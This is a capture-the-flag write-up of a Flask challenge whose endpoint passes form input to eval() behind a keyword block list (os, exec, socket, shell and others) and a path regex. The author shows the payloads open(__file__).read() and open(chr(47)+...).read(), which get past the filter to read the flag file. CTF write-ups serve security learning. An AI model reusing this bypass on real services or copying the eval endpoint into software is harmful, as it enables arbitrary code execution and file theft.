# 3v@l

## Homepage

<figure><img src="../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

## Request

<figure><img src="../../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

### Solve

First I tried to read the file, a simple payload worked.&#x20;

```python
open(__file__).read()
```

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption><p>I changd body encoding btw*</p></figcaption></figure>

Now that I have the source code, I can peacefully test it locally without connection reset problem & also debugging is easier this way for me.

**Program:**&#x20;

```python
from flask import Flask, request, render_template_string, render_template
import re

app = Flask(__name__)

# Define blocklist keywords and regex for file paths
BLOCKLIST_KEYWORDS = ['os', 'eval', 'exec', 'bind', 'connect', 'python','python3', 'socket', 'ls', 'cat', 'shell', 'bind']
FILE_PATH_REGEX = r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'


@app.route('/')
def index():
    return render_template('index.html/')

@app.route('/execute', methods=['POST'])
def execute():
    code = request.form['code']

    # Check for blocklist keywords in submitted code
    for keyword in BLOCKLIST_KEYWORDS:
        if keyword in code:
            return render_template('error.html', keyword=keyword)

    # Check for file path using regex
    if re.search(FILE_PATH_REGEX, code):
        return render_template('error.html')

    try:
        # Execute the Python code if no blocklist keyword or file path found
        result = eval(code)
    except Exception as e:
        result = f"Error: {str(e)}"

    return render_template('result.html', result=result)

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5000)
```

Looking at file, it's a simple challenge now.

Let's break down--

```python
BLOCKLIST_KEYWORDS = ['os', 'eval', 'exec', 'bind', 'connect', 'python','python3', 'socket', 'ls', 'cat', 'shell', 'bind']
```

A simple blocklist, nothing intresting keywords anyway.\
\
Next was the regex, which basically looks if we're using file extension, backslash, unicode, etc..\
Chatgpt ftw: \
**Unicode escapes** (like `\u0041`)\
**URL encoding** (like `%20`)\
**File extensions** (like `.exe`, `.txt`)\
**File path characters** (`/` and `\`)\
**Directory traversal patterns** (`..`)

### Flag

Since the open function was enabled/something we can use, I thought to use something that's similar to `/flag.txt`but spells otherwise.

An easy approach is to use `chr()`to make ascii do our work.

```python
while 1:
    inp = input('Enter line: ')
    res = ''
    for i in inp:
        res += f'chr({ord(i)}) + '
    #print(res[:-3])
    print(f'\n\nopen({res[:-3]}).read()')

'''
Enter line: /flag.txt
chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)

open(chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)).read()
'''
```

And done.............

ascii -> string -> flag.txt :)

<figure><img src="../../../.gitbook/assets/image (142).png" alt=""><figcaption><p>I changd body encoding btw*</p></figcaption></figure>

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes's still pwning.
